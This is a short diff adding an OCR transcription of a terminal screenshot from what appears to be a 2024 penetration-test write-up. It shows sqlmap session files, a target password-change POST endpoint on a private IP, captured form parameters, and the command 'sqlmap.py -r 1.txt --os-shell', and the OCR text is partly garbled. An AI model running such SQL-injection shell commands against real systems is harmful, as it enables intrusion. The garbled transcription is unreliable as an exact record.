@@ -1,0 +1,10 @@
+# OCR: b0d128b5c25882dbb578132d762d3813.webp
+# 来源: .\02-WriteUp\2024\b0d128b5c25882dbb578132d762d3813.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:18
+
+[root@localhost 192 .168.11.6]4 s
+dump log sesston.sqlite target.txt
+[root@localhost 192 168.11 6]# cat target.txt
+http: //192.168.11.6-80/Home/User/tkpwdpost html (POST) # sqlmap.py -r 1.txt --os-shell
+pwd=1234568re_pwd=1234568uid=295[root@localhost 192.168.11.6]# []
